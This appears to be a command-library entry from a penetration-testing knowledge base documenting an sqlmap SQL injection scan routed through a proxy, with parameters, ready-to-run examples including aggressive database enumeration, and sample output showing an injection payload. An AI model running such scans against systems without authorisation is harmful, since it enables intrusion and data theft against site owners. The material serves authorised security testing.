---
id: 33a11b5f-a789-4a5b-b4d6-1e78da976c22
name: sqlmap-sql-injection-scan-with-proxy
type: command
executor: bash
data: sqlmap -u "$_TARGET_URL" --proxy="$_PROXY_URL" --batch --level=3 --risk=2
output: null
created_at: '2023-04-06T03:56:36.424482+00:00'
updated_at: '2023-04-10T20:24:18.090082+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - SQL Injection
  - SQLmap
  - Proxy
verified: true
validated: true
---

# sqlmap-sql-injection-scan-with-proxy

## Command

```bash
sqlmap -u "$_TARGET_URL" --proxy="$_PROXY_URL" --batch --level=3 --risk=2
```

## Description

This command uses SQLmap to automatically detect and test for SQL injection vulnerabilities in a target web application's URL parameters, routing all traffic through a specified proxy to anonymize the source and enable interception. It runs in non-interactive mode with moderate thoroughness and risk for efficient scanning during penetration tests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_TARGET_URL | The full target URL to test for injection (e.g., http://www.target.com/page?id=1) | Yes |
| --proxy $_PROXY_URL | Proxy server URL for routing traffic (e.g., http://127.0.0.1:8080 or socks5://proxy:1080) | Yes |
| --batch | Non-interactive mode; accepts default options without prompting | No |
| --level=3 | Testing level (1-5); higher levels test more injection points | No |
| --risk=2 | Risk level (1-3); higher risks use more aggressive payloads that may crash the app | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://www.target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch
```

Scan a simple GET parameter through a local HTTP proxy.

### Advanced Usage

```bash
sqlmap -u "https://target.com/search?q=$_QUERY" --proxy="socks5://10.0.0.1:1080" --level=5 --risk=3 --dbs --batch
```

High-level scan with database enumeration through a SOCKS proxy.

## Expected Output

If vulnerable:
```
[INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.4.3
[INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.target.com'
[INFO] fetched data logged to CSV files under '/home/user/.sqlmap/output/www.target.com'
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1234=1234--

---
```

If not vulnerable: "[INFO] all tested parameters appear to be not injectable."

## Related

- [[procedures/SQL-Injection-Scan-Using-SQLmap-with-Proxy]]
- [[tools/sqlmap]]
